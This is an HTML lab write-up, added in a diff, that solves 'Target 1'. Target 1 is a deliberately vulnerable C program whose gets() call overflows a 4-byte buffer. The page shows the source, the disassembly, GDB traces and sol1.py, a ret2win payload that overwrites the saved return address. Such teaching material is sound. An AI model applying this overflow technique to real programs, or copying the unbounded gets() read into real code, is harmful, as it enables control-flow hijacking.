@@ -1,0 +1,266 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Target 1 — Return to print_good_grade</title>
+<style>
+  :root {
+    --ink:#17202b; --muted:#5b6879; --bg:#f3f6fa; --card:#fff; --line:#d9e1eb;
+    --red:#b42318; --red-bg:#fef3f2; --green:#13713d; --green-bg:#ecfdf3;
+    --blue:#1d5fa7; --blue-bg:#eff6ff; --amber:#8a5a00; --amber-bg:#fffaeb;
+    --purple:#6941c6; --purple-bg:#f4f0ff;
+    --code-bg:#101823; --code-ink:#dce7f4; --code-muted:#8b9db2;
+    --mono:"Cascadia Code",Consolas,"SFMono-Regular","Liberation Mono",monospace;
+  }
+  * { box-sizing:border-box; }
+  html { scroll-behavior:smooth; }
+  body {
+    margin:0; color:var(--ink);
+    background:
+      radial-gradient(circle at 10% 0%, #e2ecff 0, transparent 32rem),
+      radial-gradient(circle at 92% 16%, #e7f8ef 0, transparent 28rem),
+      var(--bg);
+    font-family:"Segoe UI",system-ui,-apple-system,sans-serif; line-height:1.62;
+  }
+  a { color:var(--blue); }
+  code, pre { font-family:var(--mono); }
+  .wrap { width:min(1180px,calc(100% - 32px)); margin:0 auto; }
+
+  header.hero {
+    color:#f8fbff;
+    background:
+      radial-gradient(circle at 82% 12%, rgba(80,151,255,.28) 0, transparent 25rem),
+      radial-gradient(circle at 14% 84%, rgba(72,211,146,.14) 0, transparent 20rem),
+      linear-gradient(135deg,#101823 0%,#182a3e 54%,#14332b 100%);
+    border-bottom:1px solid #0a1017; padding:62px 0 46px;
+  }
+  .eyebrow { color:#7de0a8; text-transform:uppercase; letter-spacing:.17em; font-size:.74rem; font-weight:800; margin-bottom:14px; }
+  h1 { max-width:1000px; margin:0; font-size:clamp(2.1rem,5vw,4rem); line-height:1.04; letter-spacing:-.035em; }
+  .lede { max-width:900px; color:#bdcad9; font-size:1.08rem; margin:22px 0 26px; }
+  .badges { display:flex; flex-wrap:wrap; gap:9px; }
+  .badge { display:inline-flex; gap:7px; align-items:center; padding:7px 11px; border:1px solid rgba(255,255,255,.16); border-radius:999px; background:rgba(255,255,255,.06); color:#e8eff8; font-size:.75rem; font-weight:700; letter-spacing:.03em; }
+  .badge .dot { width:7px; height:7px; border-radius:50%; background:#7de0a8; }
+  .badge.blue .dot { background:#84bdff; }
+  .badge.amber .dot { background:#ffc266; }
+
+  main { padding:38px 0 80px; }
+  section { margin:54px 0; scroll-margin-top:18px; }
+  h2 { font-size:clamp(1.5rem,3vw,2.1rem); line-height:1.16; letter-spacing:-.025em; margin:0 0 8px; }
+  h2 .num { display:inline-grid; place-items:center; vertical-align:4px; width:34px; height:34px; margin-right:8px; border-radius:10px; background:#18283b; color:#fff; font-size:.94rem; letter-spacing:0; }
+  h3 { font-size:1.12rem; margin:26px 0 8px; }
+  p { margin:10px 0; }
+  .section-intro { color:var(--muted); max-width:930px; margin-bottom:20px; }
+
+  .toc { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:18px 22px; margin-bottom:38px; box-shadow:0 8px 24px rgba(22,34,51,.05); }
+  .toc strong { display:block; font-size:.76rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
+  .toc ol { margin:0; padding-left:20px; columns:2; column-gap:36px; }
+  .toc li { margin:5px 0; break-inside:avoid; }
+
+  .card { background:var(--card); border:1px solid var(--line); border-radius:16px; padding:22px; box-shadow:0 8px 24px rgba(22,34,51,.045); }
+  .grid { display:grid; gap:16px; }
+  .grid.two { grid-template-columns:repeat(2,minmax(0,1fr)); }
+  .grid.three { grid-template-columns:repeat(3,minmax(0,1fr)); }
+  .stat { padding:18px 20px; }
+  .stat .label { color:var(--muted); font-size:.71rem; text-transform:uppercase; letter-spacing:.11em; font-weight:800; }
+  .stat .value { font-family:var(--mono); font-size:1.08rem; font-weight:800; margin-top:6px; word-break:break-word; }
+  .stat .hint { color:var(--muted); font-size:.84rem; margin-top:3px; }
+
+  .callout { border-radius:14px; padding:16px 18px; margin:18px 0; border:1px solid; }
+  .callout strong:first-child { display:block; margin-bottom:3px; }
+  .callout.danger { background:var(--red-bg); border-color:#f5c7c2; color:#68130d; }
+  .callout.success { background:var(--green-bg); border-color:#b7ebc9; color:#0b5130; }
+  .callout.info { background:var(--blue-bg); border-color:#c7ddf8; color:#123f72; }
+  .callout.warn { background:var(--amber-bg); border-color:#f2d28a; color:#664000; }
+  .callout.purple { background:var(--purple-bg); border-color:#d9ccff; color:#3f2a83; }
+
+  .file-label { display:inline-block; margin:18px 0 -8px; padding:5px 10px; border-radius:8px 8px 0 0; background:#1b2a3d; color:#bdd0e5; font-family:var(--mono); font-size:.72rem; border:1px solid #2b3d53; border-bottom:0; }
+  .file-label + pre { margin-top:0; border-top-left-radius:0; }
+  pre { margin:16px 0; padding:18px 20px; border-radius:14px; background:var(--code-bg); color:var(--code-ink); font-size:.81rem; line-height:1.55; overflow-x:auto; border:1px solid #263649; box-shadow:inset 0 1px 0 rgba(255,255,255,.04); }
+  pre .c { color:var(--code-muted); }
+  pre .g { color:#7be0a3; }
+  pre .r { color:#ff8d84; }
+  pre .y { color:#ffd166; }
+  pre .b { color:#8ec5ff; }
+  pre .p { color:#c7a7ff; }
+
+  .table-wrap { overflow-x:auto; margin:16px 0; border:1px solid var(--line); border-radius:14px; background:#fff; }
+  table { width:100%; border-collapse:collapse; font-size:.86rem; }
+  th,td { text-align:left; padding:10px 13px; border-bottom:1px solid #e9eef5; vertical-align:top; }
+  th { background:#f7f9fc; color:#455367; font-size:.71rem; text-transform:uppercase; letter-spacing:.08em; }
+  tr:last-child td { border-bottom:0; }
+  td.mono, th.mono { font-family:var(--mono); }
+  .pill { display:inline-block; padding:2px 8px; border-radius:999px; font-size:.72rem; font-weight:800; white-space:nowrap; background:#e8edf5; color:#344257; }
+  .pill.red { background:var(--red-bg); color:var(--red); }
+  .pill.green { background:var(--green-bg); color:var(--green); }
+  .pill.blue { background:var(--blue-bg); color:var(--blue); }
+  .pill.amber { background:var(--amber-bg); color:var(--amber); }
+
+  .target-head { display:flex; justify-content:space-between; align-items:end; gap:18px; flex-wrap:wrap; margin-bottom:8px; }
+  .target-head .tag { color:var(--muted); font-family:var(--mono); font-size:.8rem; }
+  .target-banner { border-radius:14px; padding:14px 18px; margin:18px 0; background:#18283b; color:#dce7f4; border:1px solid #0f1925; }
+  .target-banner strong { color:#7de0a3; }
+  .target-banner code { color:#ffd166; }
+
+  ul,ol { padding-left:24px; }
+  li { margin:5px 0; }
+  .small { font-size:.83rem; color:var(--muted); }
+  footer { border-top:1px solid var(--line); padding:26px 0 0; color:var(--muted); font-size:.84rem; }
+
+  @media (max-width:900px) {
+    .grid.two,.grid.three { grid-template-columns:1fr; }
+    .toc ol { columns:1; }
+  }
+</style>
+<style>
+  body { overflow:auto; }
+  .backbar { padding-top:20px; }
+  .backbar a { font-size:.85rem; font-weight:700; }
+</style>
+<link rel="stylesheet" href="stack-anim.css">
+</head>
+<body>
+<div class="wrap backbar">
+  <a href="index.html#target1" target="_top">← Back to all targets</a>
+</div>
+<main class="wrap" style="padding-top:10px;padding-bottom:60px">
+<section id="stack-animation" style="margin-top:24px">
+  <div class="stack-anim" data-target="t1"></div>
+</section>
+
+<section id="target1">
+    <div class="target-head">
+      <h2><span class="num">1</span>Target 1 — return to print_good_grade</h2>
+      <span class="tag">stdin · gets · ret2win</span>
+    </div>
+    <p class="section-intro">
+      Target 1 turns the overflow into control flow. The function
+      <code>print_good_grade()</code> already exists at a fixed address; the goal is to
+      overwrite the saved return address of <code>vulnerable()</code> with that address.
+    </p>
+
+    <div class="grid two">
+      <div class="card">
+        <h3 style="margin-top:0">target1.c</h3>
+        <pre style="margin-bottom:0">void print_good_grade(void)
+{
+    puts("Your grade is perfect.");
+    exit(1);
+}
+
+void vulnerable()
+{
+    char input[4];
+    gets(input);            <span class="c">// unbounded read into 4-byte buffer</span>
+}
+
+int _main()
+{
+    vulnerable();
+    print_bad_grade();      <span class="c">// normal path</span>
+    return 0;
+}</pre>
+      </div>
+      <div class="card">
+        <h3 style="margin-top:0">Key assembly</h3>
+        <pre style="margin-bottom:0">0804a151 &lt;vulnerable&gt;:
+ push ebp
+ mov  ebp,esp
+ push ebx
+ sub  esp,0x14
+ ...
+ 804a165: lea edx,[ebp-0xc]   <span class="c">; &amp;input</span>
+ 804a168: push edx
+ 804a16b: call gets
+ ...
+ 804a174: mov ebx,[ebp-0x4]
+ 804a177: leave               <span class="c">; ESP = EBP, pop saved EBP</span>
+ 804a178: ret                 <span class="c">; pop saved EIP</span>
+
+<span class="g">0804a123 &lt;print_good_grade&gt;:
+ push ebp
+ ...
+ call puts                <span class="c">; "Your grade is perfect."</span>
+ push 1
+ call exit</span></pre>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <strong>The offset calculation</strong>
+      <code>input</code> starts at <code>EBP-0xc</code>. The saved EBP is at
+      <code>EBP+0</code>, and the saved EIP is at <code>EBP+4</code>. Therefore the
+      distance from <code>input[0]</code> to the saved EIP is
+      <code>0xc + 4 = 16</code> bytes.
+    </div>
+
+    <h3>GDB evidence — normal return vs. hijacked return</h3>
+    <div class="file-label">gdb_target1.txt</div>
+    <pre><span class="b">[1] target1: before gets(input)</span>
+<span class="g">EBP = 0xfff6ba58   ESP = 0xfff6ba30</span>
+<span class="y">input = EBP-0xc = 0xfff6ba4c</span>
+saved EIP slot = EBP+4 = 0xfff6ba5c
+<span class="r">original saved EIP = 0x0804a18e</span>  <span class="c"># return to _main, then print_bad_grade</span>
+$1 = 0xfff6ba4c
+
+<span class="b">[2] target1: AFTER gets(input)</span>
+input = 0xfff6ba4c
+<span class="g">saved EIP value NOW = 0x0804a123</span>  <span class="c"># print_good_grade</span>
+bytes around input and saved EIP:
+0xfff6ba4c: 41 41 41 41 41 41 41 41   <span class="c"># 16 A's</span>
+0xfff6ba54: 41 41 41 41 41 41 41 41
+0xfff6ba5c: <span class="g">23 a1 04 08</span>              <span class="c"># 0x0804a123 little-endian</span>
+
+<span class="b">[3] target1: at vulnerable() ret</span>
+ESP = 0xfff6ba5c
+<span class="g">ret will pop = 0x0804a123</span>
+0xfff6ba5c: 0x0804a123 0x00000000 0x00000000 0xffffdc08
+target instruction:
+   0x804a123 &lt;print_good_grade&gt;: push ebp
+
+<span class="b">[4] target1: print_good_grade() was reached</span>
+Your grade is perfect.</pre>
+
+    <h3>sol1.py, line by line</h3>
+    <div class="file-label">sol1.py</div>
+    <pre>import sys
+
+padding = b"A" * 16                    <span class="c"># fill input[4] + 12 bytes of frame</span>
+
+target = (0x0804a123).to_bytes(4, "little")  <span class="c"># print_good_grade</span>
+
+payload = padding + target             <span class="c"># 16 bytes + new saved EIP</span>
+
+sys.stdout.buffer.write(payload)       <span class="c"># stdin for ./target1</span></pre>
+
+    <div class="table-wrap">
+      <table>
+        <thead><tr><th>Line</th><th>Why it is correct</th></tr></thead>
+        <tbody>
+          <tr><td class="mono">padding = b"A" * 16</td><td>Fills the 12 bytes from <code>input</code> to saved EBP, plus 4 bytes of saved EBP, stopping exactly before saved EIP.</td></tr>
+          <tr><td class="mono">0x0804a123</td><td>The first instruction of <code>print_good_grade</code>, confirmed by <code>nm target1</code> and the GDB trace.</td></tr>
+          <tr><td class="mono">to_bytes(4, "little")</td><td>x86 is little-endian: <code>0x0804a123</code> becomes bytes <code>23 a1 04 08</code>.</td></tr>
+          <tr><td class="mono">padding + target</td><td>At offset 16, the saved return address is replaced with the win function.</td></tr>
+          <tr><td class="mono">sys.stdout.buffer.write</td><td><code>gets</code> reads these bytes from stdin.</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout success">
+      <strong>Why it works</strong>
+      When <code>vulnerable()</code> executes <code>leave; ret</code>, <code>leave</code>
+      restores the stack pointer to the saved EIP slot, and <code>ret</code> pops
+      <code>0x0804a123</code> into EIP. Execution jumps directly to
+      <code>print_good_grade</code>, bypassing <code>print_bad_grade</code>.
+    </div>
+
+    <p class="small">
+      Raw evidence: <a href="gdb_target1.txt">gdb_target1.txt</a> ·
+      disassembly: <a href="target1_disasm.txt">target1_disasm.txt</a> ·
+      source: <a href="target1.c">target1.c</a> · solution: <a href="sol1.py">sol1.py</a>
+    </p>
+  </section>
+</main>
+<script src="stack-anim.js"></script>
+</body>
+</html>
